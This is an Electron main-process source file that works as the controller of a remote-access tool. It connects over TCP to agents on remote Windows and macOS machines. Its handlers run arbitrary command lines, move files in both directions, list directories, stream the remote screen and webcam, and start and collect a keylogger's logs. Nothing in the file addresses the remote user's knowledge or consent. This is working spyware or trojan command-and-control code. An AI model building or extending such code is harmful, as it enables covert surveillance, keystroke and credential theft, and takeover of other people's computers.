import { app, BrowserWindow, dialog, ipcMain } from 'electron';
import fs from 'node:fs/promises';
import net from 'node:net';
import path from 'node:path';
import started from 'electron-squirrel-startup';

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (started) {
  app.quit();
}

const createWindow = () => {
  // Create the browser window.
  const mainWindow = new BrowserWindow({
    width: 1280,
    height: 800,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  });

  // and load the index.html of the app.
  if (MAIN_WINDOW_VITE_DEV_SERVER_URL) {
    mainWindow.loadURL(MAIN_WINDOW_VITE_DEV_SERVER_URL);
    mainWindow.webContents.openDevTools({ mode: 'detach' });
  } else {
    mainWindow.loadFile(path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}/index.html`));
  }
};

type RemotePc = {
  id: string;
  name: string;
  host: string;
  port: number;
  status: 'Online' | 'Offline';
  os: 'Windows' | 'macOS';
};

type RemotePcConfig = Omit<RemotePc, 'status'>;

let remotePcConfig: RemotePcConfig[] = [];

const screenViewerSockets = new Map<string, net.Socket>();
const webcamSockets = new Map<string, net.Socket>();

const withStatuses = async (): Promise<RemotePc[]> => {
  const statuses = await Promise.all(
    remotePcConfig.map(async (pc) => {
      try {
        const pong = await sendAgentCommand(pc.host, pc.port, 'PING', 1200);
        const isOnline = pong.includes('ok');
        return { ...pc, status: isOnline ? 'Online' : 'Offline' } as RemotePc;
      } catch {
        return { ...pc, status: 'Offline' } as RemotePc;
      }
    }),
  );
  return statuses;
};

const AGENT_REPLY_END = '\n<<END>>\n';

/** Đọc đến khi đủ `\n<<END>>\n` — khớp giao thức agent; tránh cắt nhầm ở byte đầu tiên có `\n`. */
const sendAgentCommand = (
  host: string,
  port: number,
  command: string,
  timeoutMs = 2500,
): Promise<string> =>
  new Promise((resolve, reject) => {
    const socket = new net.Socket();
    let buffer = '';
    let finished = false;

    const done = (err?: Error, data?: string) => {
      if (finished) return;
      finished = true;
      socket.destroy();
      if (err) {
        reject(err);
      } else {
        resolve((data ?? '').trim());
      }
    };

    socket.setTimeout(timeoutMs, () => done(new Error('Agent timeout')));
    socket.connect(port, host, () => {
      socket.write(`${command}\n`);
    });
    socket.on('data', (chunk) => {
      buffer += chunk.toString('utf8');
      const pos = buffer.indexOf(AGENT_REPLY_END);
      if (pos !== -1) {
        done(undefined, buffer.slice(0, pos));
      }
    });
    socket.on('error', (err) => done(err));
  });

  function startScreenViewer(
    pcId: string,
    host: string,
    port: number,
    win: BrowserWindow,
  ) {
    if (screenViewerSockets.has(pcId)) {
      return;
    }
  
    const socket = new net.Socket();
    let buffer = '';
  
    socket.connect(port, host, () => {
      socket.write('SCREEN_VIEWER_START\n');
    });
  
    socket.on('data', (chunk) => {
      buffer += chunk.toString('utf8');
    
      let pos: number;
      while ((pos = buffer.indexOf('\n<<END>>\n')) !== -1) {
        const rawMessage = buffer.slice(0, pos).trim();
        buffer = buffer.slice(pos + '\n<<END>>\n'.length);
    
        if (!rawMessage) continue;
    
        try {
          const parsed = JSON.parse(rawMessage);
    
          win.webContents.send('agent:screen-viewer-frame', parsed);
        } catch {
          // ignore invalid json
        }
      }
    });
  
    socket.on('close', () => {
      screenViewerSockets.delete(pcId);
    });
  
    socket.on('error', () => {
      screenViewerSockets.delete(pcId);
    });
  
    screenViewerSockets.set(pcId, socket);
  }

  function startWebcamStream(
    pcId: string,
    host: string,
    port: number,
    win: BrowserWindow,
  ) {
    if (webcamSockets.has(pcId)) {
      return;
    }

    const socket = new net.Socket();
    let buffer = '';

    socket.connect(port, host, () => {
      socket.write('WEBCAM_START\n');
    });

    socket.on('data', (chunk) => {
      buffer += chunk.toString('utf8');

      let pos: number;
      while ((pos = buffer.indexOf('\n<<END>>\n')) !== -1) {
        const rawMessage = buffer.slice(0, pos).trim();
        buffer = buffer.slice(pos + '\n<<END>>\n'.length);

        if (!rawMessage) continue;

        try {
          const parsed = JSON.parse(rawMessage) as Record<string, unknown>;
          win.webContents.send('agent:webcam-frame', parsed);
        } catch {
          // ignore invalid json
        }
      }
    });

    socket.on('close', () => {
      webcamSockets.delete(pcId);
    });

    socket.on('error', () => {
      webcamSockets.delete(pcId);
    });

    webcamSockets.set(pcId, socket);
  }

  function stopWebcamStream(pcId: string) {
    const socket = webcamSockets.get(pcId);
    if (!socket) return;

    try {
      socket.write('WEBCAM_STOP\n');
    } catch {
      // ignore
    }

    socket.destroy();
    webcamSockets.delete(pcId);
  }
  
  function stopScreenViewer(pcId: string) {
    const socket = screenViewerSockets.get(pcId);
    if (!socket) return;
  
    try {
      socket.write('SCREEN_VIEWER_STOP\n');
    } catch {
      // ignore
    }
  
    socket.destroy();
    screenViewerSockets.delete(pcId);
  }

ipcMain.handle('agent:list-pcs', async (): Promise<RemotePc[]> => withStatuses());

ipcMain.handle(
  'agent:add-pc',
  async (
    _event,
    payload: { name: string; host: string; port: number; os: 'Windows' | 'macOS' },
  ): Promise<RemotePc[]> => {
    const host = payload.host.trim();
    const name = payload.name.trim();
    const port = Number(payload.port);

    if (!host) {
      throw new Error('Server IP/host is required');
    }
    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      throw new Error('Port must be between 1 and 65535');
    }

    const existing = remotePcConfig.find((pc) => pc.host === host && pc.port === port);
    if (!existing) {
      remotePcConfig = [
        ...remotePcConfig,
        {
          id: `pc-${Date.now().toString(36)}`,
          name: name || `${host}:${port}`,
          host,
          port,
          os: payload.os,
        },
      ];
    }
    return withStatuses();
  },
);

ipcMain.handle(
  'agent:remove-pc',
  async (_event, payload: { pcId: string }): Promise<RemotePc[]> => {
    remotePcConfig = remotePcConfig.filter((pc) => pc.id !== payload.pcId);
    return withStatuses();
  },
);

ipcMain.handle('agent:run-command', async (_event, payload: { pcId: string; command: string }) => {
  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
  if (!target) {
    return { ok: false, message: 'Unknown target PC', raw: '' };
  }
  try {
    let timeoutMs = 2500;
    if (payload.command === 'SCREENSHOT') timeoutMs = 12000;
    else if (payload.command === 'WEBCAM_RECORD_STOP') timeoutMs = 20000;
    else if (
      payload.command === 'KEYLOGGER_GET_LOG' ||
      payload.command === 'KEYLOGGER_STOP' ||
      payload.command === 'KEYLOGGER_START'
    ) {
      timeoutMs = 30000;
    }
    const raw = await sendAgentCommand(target.host, target.port, payload.command, timeoutMs);
    return { ok: raw.includes('"ok":true'), message: 'Command executed', raw };
  } catch (error) {
    return { ok: false, message: (error as Error).message, raw: '' };
  }
});

ipcMain.handle('agent:run-line', async (_event, payload: { pcId: string; line: string }) => {
  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
  if (!target) {
    return { ok: false, message: 'Unknown target PC', raw: '' };
  }
  const line = payload.line.trim();
  if (!line) {
    return { ok: false, message: 'Empty command line', raw: '' };
  }
  try {
    const raw = await sendAgentCommand(target.host, target.port, line);
    return { ok: raw.includes('"ok":true'), message: 'Command executed', raw };
  } catch (error) {
    return { ok: false, message: (error as Error).message, raw: '' };
  }
});

ipcMain.handle(
  'agent:upload-file',
  async (_event, payload: { pcId: string; localPath: string; remotePath: string }) => {
    const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
    if (!target) return { ok: false, message: 'Unknown target PC', raw: '' };

    const localPath = payload.localPath.trim();
    const remotePath = payload.remotePath.trim();
    if (!localPath || !remotePath) {
      return { ok: false, message: 'Local path and remote path are required', raw: '' };
    }
    try {
      const bytes = await fs.readFile(localPath);
      const b64 = bytes.toString('base64');
      const line = `WRITE_FILE_BASE64 ${b64} ${remotePath}`;
      const raw = await sendAgentCommand(target.host, target.port, line, 20000);
      return { ok: raw.includes('"ok":true'), message: 'Upload executed', raw };
    } catch (error) {
      return { ok: false, message: (error as Error).message, raw: '' };
    }
  },
);

ipcMain.handle(
  'agent:download-file',
  async (_event, payload: { pcId: string; remotePath: string; localPath: string }) => {
    const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
    if (!target) return { ok: false, message: 'Unknown target PC', raw: '' };

    const remotePath = payload.remotePath.trim();
    const localPath = payload.localPath.trim();
    if (!remotePath || !localPath) {
      return { ok: false, message: 'Remote path and local path are required', raw: '' };
    }
    try {
      const raw = await sendAgentCommand(
        target.host,
        target.port,
        `READ_FILE_BASE64 ${remotePath}`,
        120000,
      );
      const parsed = JSON.parse(raw) as { ok?: boolean; data?: string; message?: string };
      if (parsed.ok !== true || typeof parsed.data !== 'string') {
        return { ok: false, message: parsed.message ?? 'Download failed', raw };
      }
      await fs.writeFile(localPath, Buffer.from(parsed.data, 'base64'));
      return { ok: true, message: 'Download executed', raw };
    } catch (error) {
      return { ok: false, message: (error as Error).message, raw: '' };
    }
  },
);

ipcMain.handle('agent:pick-local-file', async (): Promise<string | null> => {
  const result = await dialog.showOpenDialog({
    properties: ['openFile'],
  });
  if (result.canceled || result.filePaths.length === 0) return null;
  return result.filePaths[0];
});

ipcMain.handle('agent:pick-save-file', async (_event, payload: { defaultPath?: string }) => {
  const result = await dialog.showSaveDialog({
    defaultPath: payload.defaultPath || 'downloaded-file',
  });
  if (result.canceled || !result.filePath) return null;
  return result.filePath;
});

ipcMain.handle('agent:list-files', async (_event, payload: { pcId: string; dir: string }) => {
  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
  if (!target) return { ok: false, message: 'Unknown target PC', items: [] as string[], raw: '' };
  const dir = payload.dir.trim();
  if (!dir) return { ok: false, message: 'Directory is required', items: [] as string[], raw: '' };
  try {
    const raw = await sendAgentCommand(target.host, target.port, `LIST_FILES ${dir}`, 12000);
    const parsed = JSON.parse(raw) as { ok?: boolean; items?: unknown; message?: string };
    const items =
      parsed.ok && Array.isArray(parsed.items)
        ? parsed.items.filter((x): x is string => typeof x === 'string')
        : [];
    return {
      ok: parsed.ok === true,
      message:
        parsed.ok === true
          ? `Found ${items.length} file(s)`
          : parsed.message || 'List files failed',
      items,
      raw,
    };
  } catch (error) {
    return { ok: false, message: (error as Error).message, items: [] as string[], raw: '' };
  }
});

ipcMain.handle('agent:start-screen-viewer', async (_event, payload: { pcId: string }) => {
  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);

  if (!target) {
    return { ok: false, message: 'Unknown target PC' };
  }

  const win = BrowserWindow.getAllWindows()[0];
  if (!win) {
    return { ok: false, message: 'Window not found' };
  }

  startScreenViewer(payload.pcId, target.host, target.port, win);

  return { ok: true };
});

ipcMain.handle('agent:stop-screen-viewer', async (_event, payload: { pcId: string }) => {
  stopScreenViewer(payload.pcId);
  return { ok: true };
});

ipcMain.handle('agent:start-webcam', async (_event, payload: { pcId: string }) => {
  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);

  if (!target) {
    return { ok: false, message: 'Unknown target PC' };
  }

  const win = BrowserWindow.getAllWindows()[0];
  if (!win) {
    return { ok: false, message: 'Window not found' };
  }

  startWebcamStream(payload.pcId, target.host, target.port, win);

  return { ok: true };
});

ipcMain.handle('agent:stop-webcam', async (_event, payload: { pcId: string }) => {
  stopWebcamStream(payload.pcId);
  return { ok: true };
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  screenViewerSockets.forEach((socket) => socket.destroy());
  screenViewerSockets.clear();
  webcamSockets.forEach((socket) => socket.destroy());
  webcamSockets.clear();

  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.
